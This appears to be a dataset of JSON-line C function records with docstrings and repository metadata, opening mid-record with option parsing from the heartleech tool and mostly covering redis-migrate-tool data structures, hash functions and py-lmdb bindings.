(args->offline_filename) {\n            fprintf(stderr, \"[-] offline file already specified: %s\\n\",\n                    args->offline_filename);\n            free(args->offline_filename);\n        }\n        args->offline_filename = (char*)malloc(strlen(value)+1);\n        memcpy(args->offline_filename, value, strlen(value)+1);\n        args->op = Op_Offline;\n        return 1;\n    } else if (EQUALS(\"scan\", name)) {\n        args->op = Op_Scan;\n        args->is_scan = 1;\n        is_scan = 1;\n        return 0; /* no 'value' argument */\n    } else if (EQUALS(\"threads\", name) || EQUALS(\"thread\", name)) {\n        args->threads.desired = strtoul(value, 0, 0);\n        return 1;\n    } else if (EQUALS(\"scanlist\", name)) {\n        FILE *fp;\n        heartleech_set_parameter(args, \"scan\", \"true\");\n        fp = fopen(value, \"rt\");\n        if (fp == NULL) {\n            perror(value);\n            exit(1);\n        }\n        for (;;) {\n            char line[512];\n            if (fgets(line, sizeof(line), fp) == 0)\n                break;\n            while (line[0] && isspace(line[strlen(line)-1] & 0xFF))\n                line[strlen(line)-1] = '\\0';\n            while (line[0] && isspace(line[0]&0xFF))\n                memmove(line, line+1, strlen(line));\n            if (line[0] == '#' || line[0] == ';' || line[0] == '/')\n                continue;\n            if (line[0] == '\\0')\n                continue;\n            heartleech_set_parameter(args, \"target\", line);\n        }\n        fclose(fp);\n        return 1;\n    } else if (EQUALS(\"target\", name)) {\n        target_add(&args->targets, value);\n        if (args->op == 0)\n            args->op = Op_Dump;\n        return 1;\n    } else if (EQUALS(\"timeout\", name)) {\n        args->timeout = strtoul(value, 0, 0);\n        return 1;\n    } else {\n        ERROR_MSG(\"[-] unknown parameter: %s\\n\", name);\n        exit(1);\n    }\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/* Upgrades the intset to a larger encoding and inserts the given integer. */\n", "func_signal": "static intset *intsetUpgradeAndAdd(intset *is, int64_t value)", "code": "{\n    uint8_t curenc = intrev32ifbe(is->encoding);\n    uint8_t newenc = _intsetValueEncoding(value);\n    int length = intrev32ifbe(is->length);\n    int prepend = value < 0 ? 1 : 0;\n\n    /* First set new encoding and resize */\n    is->encoding = intrev32ifbe(newenc);\n    is = intsetResize(is,intrev32ifbe(is->length)+1);\n\n    /* Upgrade back-to-front so we don't overwrite values.\n     * Note that the \"prepend\" variable is used to make sure we have an empty\n     * space at either the beginning or the end of the intset. */\n    while(length--)\n        _intsetSet(is,length+prepend,_intsetGetEncoded(is,length,curenc));\n\n    /* Set the value at the beginning or the end. */\n    if (prepend)\n        _intsetSet(is,0,value);\n    else\n        _intsetSet(is,intrev32ifbe(is->length),value);\n    is->length = intrev32ifbe(intrev32ifbe(is->length)+1);\n    return is;\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Just a simple method for getting the signature\n * result must be == 16\n */\n", "func_signal": "void\nmd5_signature(const unsigned char *key, unsigned long length, unsigned char *result)", "code": "{\n    MD5_CTX my_md5;\n\n    MD5_Init(&my_md5);\n    (void)MD5_Update(&my_md5, (void *)key, length);\n    MD5_Final(result, &my_md5);\n}", "path": "redis-migrate-tool/src/rmt_hash.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Create an empty intset. */\n", "func_signal": "intset *intsetNew(void)", "code": "{\n    intset *is = rmt_alloc(sizeof(intset));\n    is->encoding = intrev32ifbe(INTSET_ENC_INT16);\n    is->length = 0;\n    return is;\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Set the value at pos, using the configured encoding. */\n", "func_signal": "static void _intsetSet(intset *is, int pos, int64_t value)", "code": "{\n    uint32_t encoding = intrev32ifbe(is->encoding);\n\n    if (encoding == INTSET_ENC_INT64) {\n        ((int64_t*)is->contents)[pos] = value;\n        memrev64ifbe(((int64_t*)is->contents)+pos);\n    } else if (encoding == INTSET_ENC_INT32) {\n        ((int32_t*)is->contents)[pos] = value;\n        memrev32ifbe(((int32_t*)is->contents)+pos);\n    } else {\n        ((int16_t*)is->contents)[pos] = value;\n        memrev16ifbe(((int16_t*)is->contents)+pos);\n    }\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Delete integer from intset */\n", "func_signal": "intset *intsetRemove(intset *is, int64_t value, int *success)", "code": "{\n    uint8_t valenc = _intsetValueEncoding(value);\n    uint32_t pos;\n    if (success) *success = 0;\n\n    if (valenc <= intrev32ifbe(is->encoding) && intsetSearch(is,value,&pos)) {\n        uint32_t len = intrev32ifbe(is->length);\n\n        /* We know we can delete */\n        if (success) *success = 1;\n\n        /* Overwrite value with tail and update length */\n        if (pos < (len-1)) intsetMoveTail(is,pos+1,pos);\n        is = intsetResize(is,len-1);\n        is->length = intrev32ifbe(len-1);\n    }\n    return is;\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Resize the intset */\n", "func_signal": "static intset *intsetResize(intset *is, uint32_t len)", "code": "{\n    uint32_t size = len*intrev32ifbe(is->encoding);\n    is = rmt_realloc(is,sizeof(intset)+size);\n    return is;\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Return the remaining space size for any new data in mbuf. Mbuf cannot\n * contain more than 2^32 bytes (4G).\n */\n", "func_signal": "uint32_t\nmbuf_size(struct mbuf *mbuf)", "code": "{\n    ASSERT(mbuf->end >= mbuf->last);\n\n    return (uint32_t)(mbuf->end - mbuf->last);\n}", "path": "redis-migrate-tool/src/rmt_mbuf.c", "commit_date": "2016-04-06 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Search for the position of \"value\". Return 1 when the value was found and\n * sets \"pos\" to the position of the value within the intset. Return 0 when\n * the value is not present in the intset and sets \"pos\" to the position\n * where \"value\" can be inserted. */\n", "func_signal": "static uint8_t intsetSearch(intset *is, int64_t value, uint32_t *pos)", "code": "{\n    int min = 0, max = intrev32ifbe(is->length)-1, mid = -1;\n    int64_t cur = -1;\n\n    /* The value can never be found when the set is empty */\n    if (intrev32ifbe(is->length) == 0) {\n        if (pos) *pos = 0;\n        return 0;\n    } else {\n        /* Check for the case where we know we cannot find the value,\n         * but do know the insert position. */\n        if (value > _intsetGet(is,intrev32ifbe(is->length)-1)) {\n            if (pos) *pos = intrev32ifbe(is->length);\n            return 0;\n        } else if (value < _intsetGet(is,0)) {\n            if (pos) *pos = 0;\n            return 0;\n        }\n    }\n\n    while(max >= min) {\n        mid = ((unsigned int)min + (unsigned int)max) >> 1;\n        cur = _intsetGet(is,mid);\n        if (value > cur) {\n            min = mid+1;\n        } else if (value < cur) {\n            max = mid-1;\n        } else {\n            break;\n        }\n    }\n\n    if (value == cur) {\n        if (pos) *pos = mid;\n        return 1;\n    } else {\n        if (pos) *pos = min;\n        return 0;\n    }\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Copy n bytes from memory area pos to mbuf.\n *\n * The memory areas should not overlap and the mbuf should have\n * enough space for n bytes.\n */\n", "func_signal": "void\nmbuf_copy(struct mbuf *mbuf, const uint8_t *pos, size_t n)", "code": "{\n    if (n == 0) {\n        return;\n    }\n\n    /* mbuf has space for n bytes */\n    ASSERT(!mbuf_full(mbuf) && n <= mbuf_size(mbuf));\n\n    /* no overlapping copy */\n    ASSERT(pos < mbuf->start || pos >= mbuf->end);\n\n    rmt_memcpy(mbuf->last, pos, n);\n    mbuf->last += n;\n}", "path": "redis-migrate-tool/src/rmt_mbuf.c", "commit_date": "2016-04-06 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Return the value at pos, given an encoding. */\n", "func_signal": "static int64_t _intsetGetEncoded(intset *is, int pos, uint8_t enc)", "code": "{\n    int64_t v64;\n    int32_t v32;\n    int16_t v16;\n\n    if (enc == INTSET_ENC_INT64) {\n        memcpy(&v64,((int64_t*)is->contents)+pos,sizeof(v64));\n        memrev64ifbe(&v64);\n        return v64;\n    } else if (enc == INTSET_ENC_INT32) {\n        memcpy(&v32,((int32_t*)is->contents)+pos,sizeof(v32));\n        memrev32ifbe(&v32);\n        return v32;\n    } else {\n        memcpy(&v16,((int16_t*)is->contents)+pos,sizeof(v16));\n        memrev16ifbe(&v16);\n        return v16;\n    }\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Return the required encoding for the provided value. */\n", "func_signal": "static uint8_t _intsetValueEncoding(int64_t v)", "code": "{\n    if (v < INT32_MIN || v > INT32_MAX)\n        return INTSET_ENC_INT64;\n    else if (v < INT16_MIN || v > INT16_MAX)\n        return INTSET_ENC_INT32;\n    else\n        return INTSET_ENC_INT16;\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Rewind the mbuf by discarding any of the read or unread data that it\n * might hold.\n */\n", "func_signal": "void\nmbuf_rewind(struct mbuf *mbuf)", "code": "{\n    mbuf->pos = mbuf->start;\n    mbuf->last = mbuf->start;\n}", "path": "redis-migrate-tool/src/rmt_mbuf.c", "commit_date": "2016-04-06 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Split mbuf h into h and t by copying data from h to t. Before\n * the copy, we invoke a precopy handler cb that will copy a predefined\n * string to the head of t.\n *\n * Return new mbuf t, if the split was successful.\n */\n", "func_signal": "struct mbuf *\nmbuf_split(struct mbuf *mbuf, uint8_t *pos)", "code": "{\n    mbuf_base *mb = mbuf->mb;\n    struct mbuf *nbuf;\n    size_t size;\n\n    if(mb == NULL || mbuf == NULL \n        || pos == NULL)\n    {\n        return NULL;\n    }\n\n    ASSERT(pos >= mbuf->pos && pos <= mbuf->last);\n\n    nbuf = mbuf_get(mb);\n    if (nbuf == NULL) {\n        return NULL;\n    }\n\n\t/* copy data from mbuf to nbuf */\n    size = (size_t)(mbuf->last - pos);\n    mbuf_copy(nbuf, pos, size);\n\n    /* adjust mbuf */\n    mbuf->last = pos;\n\n    log_debug(LOG_VVERB, \"split into mbuf %p len %\"PRIu32\" and nbuf %p len \"\n              \"%\"PRIu32\" copied %zu bytes\", mbuf, mbuf_length(mbuf), nbuf,\n              mbuf_length(nbuf), size);\n\n    return nbuf;\n}", "path": "redis-migrate-tool/src/rmt_mbuf.c", "commit_date": "2016-04-06 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Helper function to invoke port_associate for the given fd and mask.\n */\n", "func_signal": "static int aeApiAssociate(const char *where, int portfd, int fd, int mask)", "code": "{\n    int events = 0;\n    int rv, err;\n\n    if (mask & AE_READABLE)\n        events |= POLLIN;\n    if (mask & AE_WRITABLE)\n        events |= POLLOUT;\n\n    if (evport_debug)\n        fprintf(stderr, \"%s: port_associate(%d, 0x%x) = \", where, fd, events);\n\n    rv = port_associate(portfd, PORT_SOURCE_FD, fd, events,\n        (void *)(uintptr_t)mask);\n    err = errno;\n\n    if (evport_debug)\n        fprintf(stderr, \"%d (%s)\\n\", rv, rv == 0 ? \"no error\" : strerror(err));\n\n    if (rv == -1) {\n        fprintf(stderr, \"%s: port_associate: %s\\n\", where, strerror(err));\n\n        if (err == EAGAIN)\n            fprintf(stderr, \"aeApiAssociate: event port limit exceeded.\");\n    }\n\n    return rv;\n}", "path": "redis-migrate-tool/src/ae/ae_evport.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * This processes one or more 64-byte data blocks, but does NOT update\n * the bit counters.  There are no alignment requirements.\n */\n", "func_signal": "static void *\nbody(MD5_CTX *ctx, void *data, unsigned long size)", "code": "{\n    unsigned char *ptr;\n    MD5_u32plus a, b, c, d;\n    MD5_u32plus saved_a, saved_b, saved_c, saved_d;\n\n    ptr = data;\n\n    a = ctx->a;\n    b = ctx->b;\n    c = ctx->c;\n    d = ctx->d;\n\n\tdo {\n        saved_a = a;\n        saved_b = b;\n        saved_c = c;\n        saved_d = d;\n\n        /* Round 1 */\n        STEP(F, a, b, c, d, SET(0), 0xd76aa478, 7)\n        STEP(F, d, a, b, c, SET(1), 0xe8c7b756, 12)\n        STEP(F, c, d, a, b, SET(2), 0x242070db, 17)\n        STEP(F, b, c, d, a, SET(3), 0xc1bdceee, 22)\n        STEP(F, a, b, c, d, SET(4), 0xf57c0faf, 7)\n        STEP(F, d, a, b, c, SET(5), 0x4787c62a, 12)\n        STEP(F, c, d, a, b, SET(6), 0xa8304613, 17)\n        STEP(F, b, c, d, a, SET(7), 0xfd469501, 22)\n        STEP(F, a, b, c, d, SET(8), 0x698098d8, 7)\n        STEP(F, d, a, b, c, SET(9), 0x8b44f7af, 12)\n        STEP(F, c, d, a, b, SET(10), 0xffff5bb1, 17)\n        STEP(F, b, c, d, a, SET(11), 0x895cd7be, 22)\n        STEP(F, a, b, c, d, SET(12), 0x6b901122, 7)\n        STEP(F, d, a, b, c, SET(13), 0xfd987193, 12)\n        STEP(F, c, d, a, b, SET(14), 0xa679438e, 17)\n        STEP(F, b, c, d, a, SET(15), 0x49b40821, 22)\n\n        /* Round 2 */\n        STEP(G, a, b, c, d, GET(1), 0xf61e2562, 5)\n        STEP(G, d, a, b, c, GET(6), 0xc040b340, 9)\n        STEP(G, c, d, a, b, GET(11), 0x265e5a51, 14)\n        STEP(G, b, c, d, a, GET(0), 0xe9b6c7aa, 20)\n        STEP(G, a, b, c, d, GET(5), 0xd62f105d, 5)\n        STEP(G, d, a, b, c, GET(10), 0x02441453, 9)\n        STEP(G, c, d, a, b, GET(15), 0xd8a1e681, 14)\n        STEP(G, b, c, d, a, GET(4), 0xe7d3fbc8, 20)\n        STEP(G, a, b, c, d, GET(9), 0x21e1cde6, 5)\n        STEP(G, d, a, b, c, GET(14), 0xc33707d6, 9)\n        STEP(G, c, d, a, b, GET(3), 0xf4d50d87, 14)\n        STEP(G, b, c, d, a, GET(8), 0x455a14ed, 20)\n        STEP(G, a, b, c, d, GET(13), 0xa9e3e905, 5)\n        STEP(G, d, a, b, c, GET(2), 0xfcefa3f8, 9)\n        STEP(G, c, d, a, b, GET(7), 0x676f02d9, 14)\n        STEP(G, b, c, d, a, GET(12), 0x8d2a4c8a, 20)\n\n        /* Round 3 */\n        STEP(H, a, b, c, d, GET(5), 0xfffa3942, 4)\n        STEP(H, d, a, b, c, GET(8), 0x8771f681, 11)\n        STEP(H, c, d, a, b, GET(11), 0x6d9d6122, 16)\n        STEP(H, b, c, d, a, GET(14), 0xfde5380c, 23)\n        STEP(H, a, b, c, d, GET(1), 0xa4beea44, 4)\n        STEP(H, d, a, b, c, GET(4), 0x4bdecfa9, 11)\n        STEP(H, c, d, a, b, GET(7), 0xf6bb4b60, 16)\n        STEP(H, b, c, d, a, GET(10), 0xbebfbc70, 23)\n        STEP(H, a, b, c, d, GET(13), 0x289b7ec6, 4)\n        STEP(H, d, a, b, c, GET(0), 0xeaa127fa, 11)\n        STEP(H, c, d, a, b, GET(3), 0xd4ef3085, 16)\n        STEP(H, b, c, d, a, GET(6), 0x04881d05, 23)\n        STEP(H, a, b, c, d, GET(9), 0xd9d4d039, 4)\n        STEP(H, d, a, b, c, GET(12), 0xe6db99e5, 11)\n        STEP(H, c, d, a, b, GET(15), 0x1fa27cf8, 16)\n        STEP(H, b, c, d, a, GET(2), 0xc4ac5665, 23)\n\n        /* Round 4 */\n        STEP(I, a, b, c, d, GET(0), 0xf4292244, 6)\n        STEP(I, d, a, b, c, GET(7), 0x432aff97, 10)\n        STEP(I, c, d, a, b, GET(14), 0xab9423a7, 15)\n        STEP(I, b, c, d, a, GET(5), 0xfc93a039, 21)\n        STEP(I, a, b, c, d, GET(12), 0x655b59c3, 6)\n        STEP(I, d, a, b, c, GET(3), 0x8f0ccc92, 10)\n        STEP(I, c, d, a, b, GET(10), 0xffeff47d, 15)\n        STEP(I, b, c, d, a, GET(1), 0x85845dd1, 21)\n        STEP(I, a, b, c, d, GET(8), 0x6fa87e4f, 6)\n        STEP(I, d, a, b, c, GET(15), 0xfe2ce6e0, 10)\n        STEP(I, c, d, a, b, GET(6), 0xa3014314, 15)\n        STEP(I, b, c, d, a, GET(13), 0x4e0811a1, 21)\n        STEP(I, a, b, c, d, GET(4), 0xf7537e82, 6)\n        STEP(I, d, a, b, c, GET(11), 0xbd3af235, 10)\n        STEP(I, c, d, a, b, GET(2), 0x2ad7d2bb, 15)\n        STEP(I, b, c, d, a, GET(9), 0xeb86d391, 21)\n\n        a += saved_a;\n        b += saved_b;\n        c += saved_c;\n        d += saved_d;\n\n        ptr += 64;\n    } while (size -= 64);\n\n    ctx->a = a;\n    ctx->b = b;\n    ctx->c = c;\n    ctx->d = d;\n\n    return ptr;\n}", "path": "redis-migrate-tool/src/rmt_hash.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * Return the length of data in mbuf. Mbuf cannot contain more than\n * 2^32 bytes (4G).\n */\n", "func_signal": "uint32_t\nmbuf_length(struct mbuf *mbuf)", "code": "{\n    ASSERT(mbuf->last >= mbuf->pos);\n\n    return (uint32_t)(mbuf->last - mbuf->pos);\n}", "path": "redis-migrate-tool/src/rmt_mbuf.c", "commit_date": "2016-04-06 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * CRC-32 implementation compatible with libmemcached library. Unfortunately\n * this implementation does not return CRC-32 as per spec.\n */\n", "func_signal": "uint32_t\nhash_crc32(const char *key, size_t key_length)", "code": "{\n    uint64_t x;\n    uint32_t crc = UINT32_MAX;\n\n    for (x = 0; x < key_length; x++) {\n        crc = (crc >> 8) ^ crc32tab[(crc ^ (uint64_t)key[x]) & 0xff];\n    }\n\n    return ((~crc) >> 16) & 0x7fff;\n}", "path": "redis-migrate-tool/src/rmt_hash.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* ======================== Hash Murmur ========================== */\n", "func_signal": "uint32_t\nhash_murmur(const char *key, size_t length)", "code": "{\n    /*\n     * 'm' and 'r' are mixing constants generated offline.  They're not\n     * really 'magic', they just happen to work well.\n     */\n\n    const unsigned int m = 0x5bd1e995;\n    const uint32_t seed = (0xdeadbeef * (uint32_t)length);\n    const int r = 24;\n\n\n    /* Initialize the hash to a 'random' value */\n\n    uint32_t h = seed ^ (uint32_t)length;\n\n    /* Mix 4 bytes at a time into the hash */\n\n    const unsigned char * data = (const unsigned char *)key;\n\n    while (length >= 4) {\n        unsigned int k = *(unsigned int *)data;\n\n        k *= m;\n        k ^= k >> r;\n        k *= m;\n\n        h *= m;\n        h ^= k;\n\n        data += 4;\n        length -= 4;\n    }\n\n    /* Handle the last few bytes of the input array */\n\n    switch(length) {\n    case 3:\n        h ^= ((uint32_t)data[2]) << 16;\n\n    case 2:\n        h ^= ((uint32_t)data[1]) << 8;\n\n    case 1:\n        h ^= data[0];\n        h *= m;\n\n    default:\n        break;\n    };\n\n    /*\n     * Do a few final mixes of the hash to ensure the last few bytes are\n     * well-incorporated.\n     */\n\n    h ^= h >> 13;\n    h *= m;\n    h ^= h >> 15;\n\n    return h;\n}", "path": "redis-migrate-tool/src/rmt_hash.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/* Determine whether a value belongs to this set */\n", "func_signal": "uint8_t intsetFind(intset *is, int64_t value)", "code": "{\n    uint8_t valenc = _intsetValueEncoding(value);\n    return valenc <= intrev32ifbe(is->encoding) && intsetSearch(is,value,NULL);\n}", "path": "redis-migrate-tool/src/intset/intset.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/*\n * jenkins_hash() -- hash a variable-length key into a 32-bit value\n *  k       : the key (the unaligned variable-length array of bytes)\n *  length  : the length of the key, counting by bytes\n *  initval : can be any 4-byte value\n * Returns a 32-bit value.  Every bit of the key affects every bit of\n * the return value.  Two keys differing by one or two bits will have\n * totally different hash values.\n\n * The best hash table sizes are powers of 2.  There is no need to do\n * mod a prime (mod is sooo slow!).  If you need less than 32 bits,\n * use a bitmask.  For example, if you need only 10 bits, do\n *   h = (h & hashmask(10));\n * In which case, the hash table should have hashsize(10) elements.\n */\n", "func_signal": "uint32_t\nhash_jenkins(const char *key, size_t length)", "code": "{\n  uint32_t a,b,c;                                          /* internal state */\n  union { const void *ptr; size_t i; } u;     /* needed for Mac Powerbook G4 */\n\n  /* Set up the internal state */\n  a = b = c = 0xdeadbeef + ((uint32_t)length) + JENKINS_INITVAL;\n\n  u.ptr = key;\n#ifndef WORDS_BIGENDIAN\n  if ((u.i & 0x3) == 0)\n  {\n    const uint32_t *k = (const uint32_t *)key;         /* read 32-bit chunks */\n\n    /*------ all but last block: aligned reads and affect 32 bits of (a,b,c) */\n    while (length > 12)\n    {\n      a += k[0];\n      b += k[1];\n      c += k[2];\n      mix(a,b,c);\n      length -= 12;\n      k += 3;\n    }\n\n    /*----------------------------- handle the last (probably partial) block */\n    /*\n     * \"k[2]&0xffffff\" actually reads beyond the end of the string, but\n     * then masks off the part it's not allowed to read.  Because the\n     * string is aligned, the masked-off tail is in the same word as the\n     * rest of the string.  Every machine with memory protection I've seen\n     * does it on word boundaries, so is OK with this.  But VALGRIND will\n     * still catch it and complain.  The masking trick does make the hash\n     * noticably faster for short strings (like English words).\n     */\n    switch(length)\n    {\n    case 12: c+=k[2]; b+=k[1]; a+=k[0]; break;\n    case 11: c+=k[2]&0xffffff; b+=k[1]; a+=k[0]; break;\n    case 10: c+=k[2]&0xffff; b+=k[1]; a+=k[0]; break;\n    case 9 : c+=k[2]&0xff; b+=k[1]; a+=k[0]; break;\n    case 8 : b+=k[1]; a+=k[0]; break;\n    case 7 : b+=k[1]&0xffffff; a+=k[0]; break;\n    case 6 : b+=k[1]&0xffff; a+=k[0]; break;\n    case 5 : b+=k[1]&0xff; a+=k[0]; break;\n    case 4 : a+=k[0]; break;\n    case 3 : a+=k[0]&0xffffff; break;\n    case 2 : a+=k[0]&0xffff; break;\n    case 1 : a+=k[0]&0xff; break;\n    case 0 : return c;              /* zero length strings require no mixing */\n    default: return c;\n    }\n\n  }\n  else if ((u.i & 0x1) == 0)\n  {\n    const uint16_t *k = (const uint16_t *)key;         /* read 16-bit chunks */\n    const uint8_t  *k8;\n\n    /*--------------- all but last block: aligned reads and different mixing */\n    while (length > 12)\n    {\n      a += k[0] + (((uint32_t)k[1])<<16);\n      b += k[2] + (((uint32_t)k[3])<<16);\n      c += k[4] + (((uint32_t)k[5])<<16);\n      mix(a,b,c);\n      length -= 12;\n      k += 6;\n    }\n\n    /*----------------------------- handle the last (probably partial) block */\n    k8 = (const uint8_t *)k;\n    switch(length)\n    {\n    case 12: c+=k[4]+(((uint32_t)k[5])<<16);\n             b+=k[2]+(((uint32_t)k[3])<<16);\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 11: c+=((uint32_t)k8[10])<<16;     /* fall through */\n    case 10: c+=k[4];\n             b+=k[2]+(((uint32_t)k[3])<<16);\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 9 : c+=k8[8];                      /* fall through */\n    case 8 : b+=k[2]+(((uint32_t)k[3])<<16);\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 7 : b+=((uint32_t)k8[6])<<16;      /* fall through */\n    case 6 : b+=k[2];\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 5 : b+=k8[4];                      /* fall through */\n    case 4 : a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 3 : a+=((uint32_t)k8[2])<<16;      /* fall through */\n    case 2 : a+=k[0];\n             break;\n    case 1 : a+=k8[0];\n             break;\n    case 0 : return c;                     /* zero length requires no mixing */\n    default: return c;\n    }\n\n  }\n  else\n  {                        /* need to read the key one byte at a time */\n#endif /* little endian */\n    const uint8_t *k = (const uint8_t *)key;\n\n    /*--------------- all but the last block: affect some 32 bits of (a,b,c) */\n    while (length > 12)\n    {\n      a += k[0];\n      a += ((uint32_t)k[1])<<8;\n      a += ((uint32_t)k[2])<<16;\n      a += ((uint32_t)k[3])<<24;\n      b += k[4];\n      b += ((uint32_t)k[5])<<8;\n      b += ((uint32_t)k[6])<<16;\n      b += ((uint32_t)k[7])<<24;\n      c += k[8];\n      c += ((uint32_t)k[9])<<8;\n      c += ((uint32_t)k[10])<<16;\n      c += ((uint32_t)k[11])<<24;\n      mix(a,b,c);\n      length -= 12;\n      k += 12;\n    }\n\n    /*-------------------------------- last block: affect all 32 bits of (c) */\n    switch(length)                   /* all the case statements fall through */\n    {\n    case 12: c+=((uint32_t)k[11])<<24;\n    case 11: c+=((uint32_t)k[10])<<16;\n    case 10: c+=((uint32_t)k[9])<<8;\n    case 9 : c+=k[8];\n    case 8 : b+=((uint32_t)k[7])<<24;\n    case 7 : b+=((uint32_t)k[6])<<16;\n    case 6 : b+=((uint32_t)k[5])<<8;\n    case 5 : b+=k[4];\n    case 4 : a+=((uint32_t)k[3])<<24;\n    case 3 : a+=((uint32_t)k[2])<<16;\n    case 2 : a+=((uint32_t)k[1])<<8;\n    case 1 : a+=k[0];\n             break;\n    case 0 : return c;\n    default : return c;\n    }\n#ifndef WORDS_BIGENDIAN\n  }\n#endif\n\n  final(a,b,c);\n  return c;\n}", "path": "redis-migrate-tool/src/rmt_hash.c", "commit_date": "2016-01-17 00:00:00", "repo_name": "vipshop/redis-migrate-tool", "stars": 946, "license": "apache-2.0", "language": "c", "size": 860}
{"docstring": "/**\n * Cursor.put() -> bool\n */\n", "func_signal": "static PyObject *\ncursor_put(CursorObject *self, PyObject *args, PyObject *kwds)", "code": "{\n    struct cursor_put {\n        MDB_val key;\n        MDB_val val;\n        int dupdata;\n        int overwrite;\n        int append;\n    } arg = {{0, 0}, {0, 0}, 1, 1, 0};\n\n    static const struct argspec argspec[] = {\n        {\"key\", ARG_BUF, OFFSET(cursor_put, key)},\n        {\"value\", ARG_BUF, OFFSET(cursor_put, val)},\n        {\"dupdata\", ARG_BOOL, OFFSET(cursor_put, dupdata)},\n        {\"overwrite\", ARG_BOOL, OFFSET(cursor_put, overwrite)},\n        {\"append\", ARG_BOOL, OFFSET(cursor_put, append)}\n    };\n    int flags;\n    int rc;\n\n    static PyObject *cache = NULL;\n    if(parse_args(self->valid, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n\n    flags = 0;\n    if(! arg.dupdata) {\n        flags |= MDB_NODUPDATA;\n    }\n    if(! arg.overwrite) {\n        flags |= MDB_NOOVERWRITE;\n    }\n    if(arg.append) {\n        flags |= MDB_APPEND;\n    }\n\n    UNLOCKED(rc, mdb_cursor_put(self->curs, &arg.key, &arg.val, flags));\n    self->trans->mutations++;\n    if(rc) {\n        if(rc == MDB_KEYEXIST) {\n            Py_RETURN_FALSE;\n        }\n        return err_set(\"mdb_put\", rc);\n    }\n    Py_RETURN_TRUE;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Environment.reader_check() -> int\n */\n", "func_signal": "static PyObject *\nenv_reader_check(EnvObject *self)", "code": "{\n    int rc;\n    int dead;\n\n    if(! self->valid) {\n        return err_invalid();\n    }\n\n    if((rc = mdb_reader_check(self->env, &dead))) {\n        return err_set(\"mdb_reader_check\", rc);\n    }\n    return PyLong_FromLongLong(dead);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
